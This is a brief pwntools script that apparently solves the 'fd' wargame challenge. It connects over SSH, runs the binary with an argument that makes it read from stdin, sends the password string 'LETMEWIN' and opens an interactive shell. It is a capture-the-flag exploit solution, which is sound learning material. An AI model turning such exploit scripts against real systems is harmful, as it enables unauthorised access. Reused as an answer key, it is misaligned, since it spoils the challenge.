from pwn import ssh
import util

connection = util.connectPwnable('fd')
executable = util.Executable('fd', connection)
program = executable.run(0x1234)
program.sendline(b'LETMEWIN')
program.interactive()





